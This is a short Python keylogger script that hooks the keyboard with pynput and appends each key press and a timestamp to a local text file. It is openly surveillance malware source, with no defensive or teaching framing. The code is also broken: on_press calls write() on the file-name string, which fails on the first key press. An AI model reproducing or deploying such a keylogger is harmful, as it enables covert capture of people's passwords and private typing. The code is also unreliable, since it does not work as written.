import datetime
from pynput import keyboard

# Create file to write the keystrokes to
logFile = "pressedKeys.txt"

# Function that handles the keystrokes
def on_press(key):

 # For readability added a timestamp
    systemTime = datetime.datetime.now();
    timeStamp = systemTime.strftime("%d/%m/%Y %H:%M:%S")
    logFile.write("Logged: " + timeStamp + "\n")

 # Open the file and write each keystroke
    with open (logFile, 'a') as f:
        f.write(timeStamp + "\n")
        f.write(f"{key}\n")

# Starting the keylogger
def startKeylogger ():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Run the script directly
if __name__ == "__main__":
    startKeylogger()